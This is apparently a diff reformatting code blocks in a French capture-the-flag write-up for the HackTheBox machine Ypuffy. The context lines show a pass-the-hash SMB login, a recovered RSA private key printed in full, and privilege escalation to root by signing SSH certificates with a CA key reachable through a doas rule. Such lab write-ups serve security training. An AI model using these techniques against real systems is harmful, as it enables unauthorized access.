@@ -17,7 +17,7 @@ Poisson à piques
 
 On découvre rapidement la nature de l'OS avec un scan Nmap :  
 
-```plain
+```
 Nmap scan report for ypuffy.hackthebox.htb (10.10.10.107)
 Host is up (0.030s latency).
 
@@ -160,7 +160,7 @@ Passe passe le hash, il y a du monde sur le câble RJ45
 
 Depuis Kali on peut avoir recours aux versions *pth* de Samba pour se connecter via ce hash :  
 
-```plain
+```
 $ pth-smbclient --pw-nt-hash -U alice1978 -I 10.10.10.107 -L YPUFFY //YPUFFY/ 0B186E661BBDBDCF6047784DE8B9FD8B
 WARNING: The "syslog" option is deprecated
 
@@ -189,7 +189,7 @@ smb: \> ls
 
 Ce fichier PPK une fois récupéré s'avère être une clé SSH au format Putty :  
 
-```plain
+```
 PuTTY-User-Key-File-2: ssh-rsa
 Encryption: none
 Comment: rsa-key-20180716
@@ -222,7 +222,7 @@ La conversion vers une clé SSH dans le format classique se fait via l'utilitair
 
 On obtient alors la clé privée suivante :  
 
-```plain
+```
 -----BEGIN RSA PRIVATE KEY-----
 MIIEogIBAAKCAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR
 +gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A
@@ -252,7 +252,7 @@ WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
 -----END RSA PRIVATE KEY-----
 ```
 
-```plain
+```
 $ ssh -i private_key alice1978@10.10.10.107
 OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
 
@@ -274,14 +274,14 @@ acbc06eb2982b14c2756b6c6e3767aab
 
 On ne voit pas d'utilisateur *bob* dans le fichier *passwd* mais la ligne commençant par un + en fin de fichier est typique de NIS.  
 
-```plain
+```
 +:*:0:0:::
 userca:*:1001:1001:User CA:/home/userca:/bin/ksh
 ```
 
 Concernant l'utilisateur *userca*, il possède différents fichiers sur le système :  
 
-```plain
+```
 ypuffy$ find / -user userca 2> /dev/null
 /home/userca
 /home/userca/.ssh
@@ -319,7 +319,7 @@ grant select on principals,keys to appsrv;
 
 Dans le fichier */var/www/logs/access.log* on peut lire les 4 premières lignes suivantes :  
 
-```plain
+```
 ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
 ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:36:34 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
 ypuffy.hackthebox.htb 127.0.0.1 - - [31/Jul/2018:23:37:37 -0400] "GET /sshauth?type=keys%26username=root HTTP/1.1" 200 0
@@ -330,7 +330,7 @@ Cela m'a incité à jeter un œil au serveur web qui nous était inaccessible de
 
 Si la requête ne retourne rien pour *root*, *bob8791* et *userca* on obtient en revanche une clé publique pour Alice :  
 
-```plain
+```
 ypuffy$ curl -D- "http://127.0.0.1/sshauth?type=keys&username=alice1978"
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -346,7 +346,7 @@ L'emplacement des sources de l'application web est facile à trouver vu que le p
 
 Vu que le fichier SQL mentionnait une table *principals* en plus de la table *keys*, autant essayer de changer la valeur de la clé *type* :  
 
-```plain
+```
 ypuffy$ curl -D- "http://127.0.0.1/sshauth?type=principals&username=root"
 HTTP/1.1 200 OK
 Connection: keep-alive
@@ -367,7 +367,7 @@ Après quelques errances sans rien trouver je me suis retranché sur un bon vieu
 
 D'abord dans */etc/ssh/sshd\_config* :
 
-```plain
+```
 AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
 AuthorizedKeysCommandUser nobody
 
@@ -378,7 +378,7 @@ AuthorizedPrincipalsCommandUser nobody
 
 et aussi dans le fichier */etc/doas.conf* :  
 
-```plain
+```
 permit keepenv :wheel
 permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
 ```
@@ -391,7 +391,7 @@ Le premier réflexe (et en partie le bon) est de se jeter sur [la page de manuel
 
 Il semble qu'au mieux on puisse obtenir son hash SHA256. Le brute-force est laissé en exercice au lecteur :D  
 
-```plain
+```
 ypuffy$ doas -u userca /usr/bin/ssh-keygen -l
 Enter file in which the key is (/home/userca/.ssh/id_rsa): /home/userca/ca
 2048 SHA256:WCPFBuZqiubacS+hgAGylLHBjatuKa8zoWO2vFFycsg userca@ypuffy.hackthebox.htb (RSA)
@@ -401,7 +401,7 @@ Il est maintenant temps d'essayer de signer notre clé publique avec la clé pri
 
 Il faut préalablement copier notre clé publique sur le système (*devloop.pub*) et spécifier un *principal* valide :  
 
-```plain
+```
 ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I user_bob8791 -n bob8791 devloop.pub                                                                                          
 Signed user key devloop-cert.pub: id "user_bob8791" serial 0 for bob8791 valid forever
 ypuffy$ ls
@@ -414,7 +414,7 @@ Une fois ce fichier *devloop-cert.pub* généré on le rapatrie sur notre systè
 
 On peut alors se connecter en tant que *bob8791* sur le système. Il en va exactement de même avec l'utilisateur root sauf que le principal est *3m3rgencyB4ckd00r*.  
 
-```plain
+```
 $ ssh root@10.10.10.107
 OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
 
